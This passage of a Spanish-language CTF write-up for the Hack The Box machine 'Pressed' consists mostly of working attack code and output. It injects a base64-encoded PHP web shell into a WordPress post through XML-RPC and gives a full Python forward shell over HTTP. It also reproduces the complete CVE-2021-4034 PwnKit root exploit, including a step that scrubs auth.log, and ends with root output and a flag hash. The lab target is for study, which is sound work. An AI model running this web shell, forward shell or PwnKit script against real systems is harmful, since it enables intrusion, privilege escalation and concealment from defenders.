+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">copia</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">posts</span><span class="o">.</span><span class="n">GetPosts</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">copia</span><span class="o">.</span><span class="n">content</span> <span class="o">=</span> <span class="s1">&#39;&lt;!-- wp:paragraph --&gt;</span><span class="se">\n</span><span class="s1">&lt;p&gt;The UHC January Finals are underway!  After this event, there are only three left until the season one finals in which all the previous winners will compete in the Tournament of Champions. This event a total of eight players qualified, seven of which are from Brazil and there is one lone Canadian.  Metrics for this event can be found below.&lt;/p&gt;</span><span class="se">\n</span><span class="s1">&lt;!-- /wp:paragraph --&gt;</span><span class="se">\n\n</span><span class="s1">&lt;!-- wp:php-everywhere-block/php {&quot;code&quot;:&quot;PD9waHAKCWZpbGVfcHV0X2NvbnRlbnRzKCd4c2hlbGwucGhwJywgYmFzZTY0X2RlY29kZSgnUEQ5d2FIQUtDV1ZqYUc4Z2MyaGxiR3hmWlhobFl5Z2tYMUpGVVZWRlUxUmJKMk50WkNkZEtUc0tQejRLJykpOwoJZWNobygiU3VjY2VzcyIpOwo/Pgo=&quot;,&quot;version&quot;:&quot;3.0.0&quot;} /--&gt;</span><span class="se">\n\n</span><span class="s1">&lt;!-- wp:paragraph --&gt;</span><span class="se">\n</span><span class="s1">&lt;p&gt;&lt;/p&gt;</span><span class="se">\n</span><span class="s1">&lt;!-- /wp:paragraph --&gt;</span><span class="se">\n\n</span><span class="s1">&lt;!-- wp:paragraph --&gt;</span><span class="se">\n</span><span class="s1">&lt;p&gt;&lt;/p&gt;</span><span class="se">\n</span><span class="s1">&lt;!-- /wp:paragraph --&gt;&#39;</span>
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="n">client</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">posts</span><span class="o">.</span><span class="n">NewPost</span><span class="p">(</span><span class="n">copia</span><span class="p">))</span>
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="s1">&#39;49&#39;</span>
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="c1"># Una vez ejecutado el post, ya tenemos RCE:</span>
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">pressed</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">xshell</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="nb">id</span>
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a><span class="c1">## Alternativa EDITAR original - Se indica el id del post que se quiere editar y la copia modificada para machacar el original:</span>
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">client</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">posts</span><span class="o">.</span><span class="n">EditPost</span><span class="p">(</span><span class="n">malicious_post</span><span class="o">.</span><span class="n">id</span><span class="p">,</span><span class="n">malicious_post</span><span class="p">))</span>
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a><span class="kc">True</span>
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a><span class="c1">## Repaso de como copiar - De este modo se puede copiar un post existente a uno nuevo o incluso borrarlo:</span>
+<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">targetpost</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">wp</span><span class="o">.</span><span class="n">posts</span><span class="o">.</span><span class="n">GetPosts</span><span class="p">())[</span><span class="mi">0</span><span class="p">]</span>
+<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">client</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">posts</span><span class="o">.</span><span class="n">NewPost</span><span class="p">(</span><span class="n">targetpost</span><span class="p">))</span>
+<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a><span class="s1">&#39;50&#39;</span>
+<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">client</span><span class="o">.</span><span class="n">call</span><span class="p">(</span><span class="n">posts</span><span class="o">.</span><span class="n">DeletePost</span><span class="p">(</span><span class="n">targetpost</span><span class="p">))</span>
+<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a><span class="kc">True</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="explotation">Explotation</h2>
+<ul>
+<li>
+<p>Ya que la máquina tiene iptables y rechaza las conexiones tcp y udp, se usa una fakeshell ttyoverhttp:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="ch">#!/usr/bin/python3</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>import requests, time, threading, pdb, signal, sys
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>from base64 import b64encode
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>from random import randrange
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>class AllTheReads<span class="o">(</span>object<span class="o">)</span>:
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>    def __init__<span class="o">(</span>self, <span class="nv">interval</span><span class="o">=</span><span class="m">1</span><span class="o">)</span>:
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>        self.interval <span class="o">=</span> interval
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>        <span class="nv">thread</span> <span class="o">=</span> threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>self.run, <span class="nv">args</span><span class="o">=())</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>        thread.daemon <span class="o">=</span> True
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>        thread.start<span class="o">()</span>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>    def run<span class="o">(</span>self<span class="o">)</span>:
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>        <span class="nv">readoutput</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;/bin/cat %s&quot;&quot;&quot;</span> % <span class="o">(</span>stdout<span class="o">)</span>
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>        <span class="nv">clearoutput</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;echo &#39;&#39; &gt; %s&quot;&quot;&quot;</span> % <span class="o">(</span>stdout<span class="o">)</span>
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>        <span class="k">while</span> True:
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>            <span class="nv">output</span> <span class="o">=</span> RunCmd<span class="o">(</span>readoutput<span class="o">)</span>
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>            <span class="k">if</span> output:
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>                RunCmd<span class="o">(</span>clearoutput<span class="o">)</span>
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>                print<span class="o">(</span>output<span class="o">)</span>
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>            time.sleep<span class="o">(</span>self.interval<span class="o">)</span>
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>
+<a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>def RunCmd<span class="o">(</span>cmd<span class="o">)</span>:
+<a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>    <span class="nv">cmd</span> <span class="o">=</span> cmd.encode<span class="o">(</span><span class="s1">&#39;utf-8&#39;</span><span class="o">)</span>
+<a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>    <span class="nv">cmd</span> <span class="o">=</span> b64encode<span class="o">(</span>cmd<span class="o">)</span>.decode<span class="o">(</span><span class="s1">&#39;utf-8&#39;</span><span class="o">)</span>
+<a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a>    <span class="nv">payload</span> <span class="o">=</span> <span class="o">{</span>
+<a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>            <span class="s1">&#39;cmd&#39;</span> : <span class="s1">&#39;echo &quot;%s&quot; | base64 -d | sh&#39;</span> %<span class="o">(</span>cmd<span class="o">)</span>
+<a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a>        <span class="o">}</span>
+<a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a>    <span class="nv">result</span> <span class="o">=</span> <span class="o">(</span>requests.get<span class="o">(</span><span class="s1">&#39;http://pressed.htb/xshell.php&#39;</span>, <span class="nv">params</span><span class="o">=</span>payload, <span class="nv">timeout</span><span class="o">=</span><span class="m">5</span><span class="o">)</span>.text<span class="o">)</span>.strip<span class="o">()</span>
+<a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>    <span class="k">return</span> result
+<a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a>
+<a id="__codelineno-7-33" name="__codelineno-7-33" href="#__codelineno-7-33"></a>def WriteCmd<span class="o">(</span>cmd<span class="o">)</span>:
+<a id="__codelineno-7-34" name="__codelineno-7-34" href="#__codelineno-7-34"></a>    <span class="nv">cmd</span> <span class="o">=</span> cmd.encode<span class="o">(</span><span class="s1">&#39;utf-8&#39;</span><span class="o">)</span>
+<a id="__codelineno-7-35" name="__codelineno-7-35" href="#__codelineno-7-35"></a>    <span class="nv">cmd</span> <span class="o">=</span> b64encode<span class="o">(</span>cmd<span class="o">)</span>.decode<span class="o">(</span><span class="s1">&#39;utf-8&#39;</span><span class="o">)</span>
+<a id="__codelineno-7-36" name="__codelineno-7-36" href="#__codelineno-7-36"></a>    <span class="nv">payload</span> <span class="o">=</span> <span class="o">{</span>
+<a id="__codelineno-7-37" name="__codelineno-7-37" href="#__codelineno-7-37"></a>        <span class="s1">&#39;cmd&#39;</span> : <span class="s1">&#39;echo &quot;%s&quot; | base64 -d &gt; %s&#39;</span> % <span class="o">(</span>cmd, stdin<span class="o">)</span>
+<a id="__codelineno-7-38" name="__codelineno-7-38" href="#__codelineno-7-38"></a>    <span class="o">}</span>
+<a id="__codelineno-7-39" name="__codelineno-7-39" href="#__codelineno-7-39"></a>    <span class="nv">result</span> <span class="o">=</span> <span class="o">(</span>requests.get<span class="o">(</span><span class="s1">&#39;http://pressed.htb/xshell.php&#39;</span>, <span class="nv">params</span><span class="o">=</span>payload, <span class="nv">timeout</span><span class="o">=</span><span class="m">5</span><span class="o">)</span>.text<span class="o">)</span>.strip<span class="o">()</span>
+<a id="__codelineno-7-40" name="__codelineno-7-40" href="#__codelineno-7-40"></a>    <span class="k">return</span> result
+<a id="__codelineno-7-41" name="__codelineno-7-41" href="#__codelineno-7-41"></a>
+<a id="__codelineno-7-42" name="__codelineno-7-42" href="#__codelineno-7-42"></a>def ReadCmd<span class="o">()</span>:
+<a id="__codelineno-7-43" name="__codelineno-7-43" href="#__codelineno-7-43"></a>        <span class="nv">GetOutput</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;/bin/cat %s&quot;&quot;&quot;</span> % <span class="o">(</span>stdout<span class="o">)</span>
+<a id="__codelineno-7-44" name="__codelineno-7-44" href="#__codelineno-7-44"></a>        <span class="nv">output</span> <span class="o">=</span> RunCmd<span class="o">(</span>GetOutput<span class="o">)</span>
+<a id="__codelineno-7-45" name="__codelineno-7-45" href="#__codelineno-7-45"></a>        <span class="k">return</span> output
+<a id="__codelineno-7-46" name="__codelineno-7-46" href="#__codelineno-7-46"></a>
+<a id="__codelineno-7-47" name="__codelineno-7-47" href="#__codelineno-7-47"></a>def SetupShell<span class="o">()</span>:
+<a id="__codelineno-7-48" name="__codelineno-7-48" href="#__codelineno-7-48"></a>    <span class="nv">NamedPipes</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;mkfifo %s; tail -f %s | /bin/sh 2&gt;&amp;1 &gt; %s&quot;&quot;&quot;</span> % <span class="o">(</span>stdin, stdin, stdout<span class="o">)</span>
+<a id="__codelineno-7-49" name="__codelineno-7-49" href="#__codelineno-7-49"></a>    try:
+<a id="__codelineno-7-50" name="__codelineno-7-50" href="#__codelineno-7-50"></a>        RunCmd<span class="o">(</span>NamedPipes<span class="o">)</span>
+<a id="__codelineno-7-51" name="__codelineno-7-51" href="#__codelineno-7-51"></a>    except:
+<a id="__codelineno-7-52" name="__codelineno-7-52" href="#__codelineno-7-52"></a>        None
+<a id="__codelineno-7-53" name="__codelineno-7-53" href="#__codelineno-7-53"></a>    <span class="k">return</span> None
+<a id="__codelineno-7-54" name="__codelineno-7-54" href="#__codelineno-7-54"></a>
+<a id="__codelineno-7-55" name="__codelineno-7-55" href="#__codelineno-7-55"></a>global stdin, stdout
+<a id="__codelineno-7-56" name="__codelineno-7-56" href="#__codelineno-7-56"></a><span class="nv">session</span> <span class="o">=</span> randrange<span class="o">(</span><span class="m">1000</span>, <span class="m">9999</span><span class="o">)</span>
+<a id="__codelineno-7-57" name="__codelineno-7-57" href="#__codelineno-7-57"></a><span class="nv">stdin</span> <span class="o">=</span> <span class="s2">&quot;/dev/shm/input.%s&quot;</span> % <span class="o">(</span>session<span class="o">)</span>
+<a id="__codelineno-7-58" name="__codelineno-7-58" href="#__codelineno-7-58"></a><span class="nv">stdout</span> <span class="o">=</span> <span class="s2">&quot;/dev/shm/output.%s&quot;</span> % <span class="o">(</span>session<span class="o">)</span>
+<a id="__codelineno-7-59" name="__codelineno-7-59" href="#__codelineno-7-59"></a><span class="nv">erasestdin</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;/bin/rm %s&quot;&quot;&quot;</span> % <span class="o">(</span>stdin<span class="o">)</span>
+<a id="__codelineno-7-60" name="__codelineno-7-60" href="#__codelineno-7-60"></a><span class="nv">erasestdout</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;/bin/rm %s&quot;&quot;&quot;</span> % <span class="o">(</span>stdout<span class="o">)</span>
+<a id="__codelineno-7-61" name="__codelineno-7-61" href="#__codelineno-7-61"></a>
+<a id="__codelineno-7-62" name="__codelineno-7-62" href="#__codelineno-7-62"></a>SetupShell<span class="o">()</span>
+<a id="__codelineno-7-63" name="__codelineno-7-63" href="#__codelineno-7-63"></a>
+<a id="__codelineno-7-64" name="__codelineno-7-64" href="#__codelineno-7-64"></a><span class="nv">ReadingTheThings</span> <span class="o">=</span> AllTheReads<span class="o">()</span>
+<a id="__codelineno-7-65" name="__codelineno-7-65" href="#__codelineno-7-65"></a>
+<a id="__codelineno-7-66" name="__codelineno-7-66" href="#__codelineno-7-66"></a>def sig_handler<span class="o">(</span>sig, frame<span class="o">)</span>:
+<a id="__codelineno-7-67" name="__codelineno-7-67" href="#__codelineno-7-67"></a>    print<span class="o">(</span><span class="s2">&quot;\n\n[*] Exiting...\n&quot;</span><span class="o">)</span>
+<a id="__codelineno-7-68" name="__codelineno-7-68" href="#__codelineno-7-68"></a>    print<span class="o">(</span><span class="s2">&quot;[*] Removing files...\n&quot;</span><span class="o">)</span>
+<a id="__codelineno-7-69" name="__codelineno-7-69" href="#__codelineno-7-69"></a>    RunCmd<span class="o">(</span>erasestdin<span class="o">)</span>
+<a id="__codelineno-7-70" name="__codelineno-7-70" href="#__codelineno-7-70"></a>    RunCmd<span class="o">(</span>erasestdout<span class="o">)</span>
+<a id="__codelineno-7-71" name="__codelineno-7-71" href="#__codelineno-7-71"></a>    print<span class="o">(</span><span class="s2">&quot;[*] All files have been deleted\n&quot;</span><span class="o">)</span>
+<a id="__codelineno-7-72" name="__codelineno-7-72" href="#__codelineno-7-72"></a>    sys.exit<span class="o">(</span><span class="m">0</span><span class="o">)</span>
+<a id="__codelineno-7-73" name="__codelineno-7-73" href="#__codelineno-7-73"></a>
+<a id="__codelineno-7-74" name="__codelineno-7-74" href="#__codelineno-7-74"></a>signal.signal<span class="o">(</span>signal.SIGINT, sig_handler<span class="o">)</span>
+<a id="__codelineno-7-75" name="__codelineno-7-75" href="#__codelineno-7-75"></a>
+<a id="__codelineno-7-76" name="__codelineno-7-76" href="#__codelineno-7-76"></a><span class="k">while</span> True:
+<a id="__codelineno-7-77" name="__codelineno-7-77" href="#__codelineno-7-77"></a>    <span class="nv">cmd</span> <span class="o">=</span> input<span class="o">(</span><span class="s2">&quot;&gt; &quot;</span><span class="o">)</span>
+<a id="__codelineno-7-78" name="__codelineno-7-78" href="#__codelineno-7-78"></a>    WriteCmd<span class="o">(</span>cmd + <span class="s2">&quot;\n&quot;</span><span class="o">)</span>
+<a id="__codelineno-7-79" name="__codelineno-7-79" href="#__codelineno-7-79"></a>    time.sleep<span class="o">(</span><span class="m">1</span>.1<span class="o">)</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="postexplotation-pwnkit">PostExplotation - PWNKIT</h2>
+<ul>
+<li>
+<p>Existe un exploit para escalar a traves del binario /usr/bin/pkexec:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="ch">#!/bin/bash</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">echo</span> <span class="s2">&quot;██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ &quot;</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nb">echo</span> <span class="s2">&quot;██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗&quot;</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="nb">echo</span> <span class="s2">&quot;██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝&quot;</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nb">echo</span> <span class="s2">&quot;██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗&quot;</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="nb">echo</span> <span class="s2">&quot;██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║&quot;</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="nb">echo</span> <span class="s2">&quot;╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝&quot;</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="nb">echo</span> <span class="s2">&quot;CVE-2021-4034 PoC by Kim Schulz&quot;</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="c1"># shell poc by Kim Schulz</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="nb">echo</span> <span class="s2">&quot;[+] Setting up environment...&quot;</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>mkdir -p <span class="s1">&#39;GCONV_PATH=.&#39;</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>touch <span class="s1">&#39;GCONV_PATH=./pkwner&#39;</span>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>chmod a+x <span class="s1">&#39;GCONV_PATH=./pkwner&#39;</span>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>mkdir -p pkwner
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="nb">echo</span> <span class="s2">&quot;module UTF-8// PKWNER// pkwner 2&quot;</span> &gt; pkwner/gconv-modules
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>cat &gt; pkwner/pkwner.c <span class="s">&lt;&lt;- EOM</span>
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a><span class="s">#include &lt;stdio.h&gt;</span>
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="s">#include &lt;stdlib.h&gt;</span>
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="s">#include &lt;unistd.h&gt;</span>
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="s">void gconv() {}</span>
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="s">void gconv_init() {</span>
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a><span class="s">printf(&quot;hello&quot;);</span>
+<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="s">setuid(0); setgid(0);</span>
+<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a><span class="s">    seteuid(0); setegid(0);</span>
+<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="s">system(&quot;PATH=/bin:/usr/bin:/usr/sbin:/usr/local/bin/:/usr/local/sbin;&quot;</span>
+<a id="__codelineno-8-26" name="__codelineno-8-26" href="#__codelineno-8-26"></a><span class="s">        &quot;rm -rf &#39;GCONV_PATH=.&#39; &#39;pkwner&#39;;&quot;</span>
+<a id="__codelineno-8-27" name="__codelineno-8-27" href="#__codelineno-8-27"></a><span class="s">        &quot;cat /var/log/auth.log|grep -v pkwner &gt;/tmp/al;cat /tmp/al &gt;/var/log/auth.log;&quot;</span>
+<a id="__codelineno-8-28" name="__codelineno-8-28" href="#__codelineno-8-28"></a><span class="s">        &quot;/bin/bash&quot;);</span>
+<a id="__codelineno-8-29" name="__codelineno-8-29" href="#__codelineno-8-29"></a><span class="s">    exit(0);</span>
+<a id="__codelineno-8-30" name="__codelineno-8-30" href="#__codelineno-8-30"></a><span class="s">}</span>
+<a id="__codelineno-8-31" name="__codelineno-8-31" href="#__codelineno-8-31"></a><span class="s">EOM</span>
+<a id="__codelineno-8-32" name="__codelineno-8-32" href="#__codelineno-8-32"></a>
+<a id="__codelineno-8-33" name="__codelineno-8-33" href="#__codelineno-8-33"></a>cat &gt; pkwner/exec.c <span class="s">&lt;&lt;- EOM</span>
+<a id="__codelineno-8-34" name="__codelineno-8-34" href="#__codelineno-8-34"></a><span class="s">#include &lt;stdlib.h&gt;</span>
+<a id="__codelineno-8-35" name="__codelineno-8-35" href="#__codelineno-8-35"></a><span class="s">#include &lt;unistd.h&gt;</span>
+<a id="__codelineno-8-36" name="__codelineno-8-36" href="#__codelineno-8-36"></a><span class="s">int main(){</span>
+<a id="__codelineno-8-37" name="__codelineno-8-37" href="#__codelineno-8-37"></a><span class="s">char *env[] = {&quot;pkwner&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PKWNER&quot;,</span>
+<a id="__codelineno-8-38" name="__codelineno-8-38" href="#__codelineno-8-38"></a><span class="s">                &quot;SHELL=pkwner&quot;, NULL};</span>
+<a id="__codelineno-8-39" name="__codelineno-8-39" href="#__codelineno-8-39"></a><span class="s">execve(&quot;/usr/bin/pkexec&quot;, (char *[]){NULL}, env);</span>
+<a id="__codelineno-8-40" name="__codelineno-8-40" href="#__codelineno-8-40"></a><span class="s">}</span>
+<a id="__codelineno-8-41" name="__codelineno-8-41" href="#__codelineno-8-41"></a><span class="s">EOM</span>
+<a id="__codelineno-8-42" name="__codelineno-8-42" href="#__codelineno-8-42"></a><span class="nb">echo</span> <span class="s2">&quot;[+] Build offensive gconv shared module...&quot;</span>
+<a id="__codelineno-8-43" name="__codelineno-8-43" href="#__codelineno-8-43"></a>gcc -fPIC -shared -o pkwner/pkwner.so pkwner/pkwner.c
+<a id="__codelineno-8-44" name="__codelineno-8-44" href="#__codelineno-8-44"></a><span class="nb">echo</span> <span class="s2">&quot;[+] Build mini executor...&quot;</span>
+<a id="__codelineno-8-45" name="__codelineno-8-45" href="#__codelineno-8-45"></a>gcc -o pkwner/executor pkwner/exec.c
+<a id="__codelineno-8-46" name="__codelineno-8-46" href="#__codelineno-8-46"></a><span class="c1"># export PATH=&quot;GCONV_PATH=.&quot;</span>
+<a id="__codelineno-8-47" name="__codelineno-8-47" href="#__codelineno-8-47"></a><span class="c1"># export CHARSET=&quot;PKWNER&quot;</span>
+<a id="__codelineno-8-48" name="__codelineno-8-48" href="#__codelineno-8-48"></a><span class="c1">#export SHELL=pkwner</span>
+<a id="__codelineno-8-49" name="__codelineno-8-49" href="#__codelineno-8-49"></a><span class="nv">PATH</span><span class="o">=</span><span class="s1">&#39;GCONV_PATH=.&#39;</span> ./pkwner/executor
+<a id="__codelineno-8-50" name="__codelineno-8-50" href="#__codelineno-8-50"></a><span class="nb">echo</span> <span class="s2">&quot;[+] Nice Job&quot;</span>
+</code></pre></div>
+</li>
+</ul>
+<h2 id="escalado-a-root">Escalado a root:</h2>
+<ul>
+<li>
+<p>Tras ejecutar el exploit en la ttyoverhttp se escala a root:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a> pwnkit.sh
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>██████╗ ██╗  ██╗██╗    ██╗███╗   ██╗███████╗██████╗ 
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>██╔══██╗██║ ██╔╝██║    ██║████╗  ██║██╔════╝██╔══██╗
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>██████╔╝█████╔╝ ██║ █╗ ██║██╔██╗ ██║█████╗  ██████╔╝
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>██╔═══╝ ██╔═██╗ ██║███╗██║██║╚██╗██║██╔══╝  ██╔══██╗
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>██║     ██║  ██╗╚███╔███╔╝██║ ╚████║███████╗██║  ██║
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>╚═╝     ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>CVE-2021-4034 PoC by Kim Schulz
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="o">[</span>+<span class="o">]</span> Setting up environment...
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="o">[</span>+<span class="o">]</span> Build offensive gconv shared module...
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="o">[</span>+<span class="o">]</span> Build mini executor...
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a>id
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>whoami
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a>root
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a>cat /root/root.txt
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>5e4234f88f66431f1513e2bee958ef20
+</code></pre></div>
+</li>
+</ul>
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
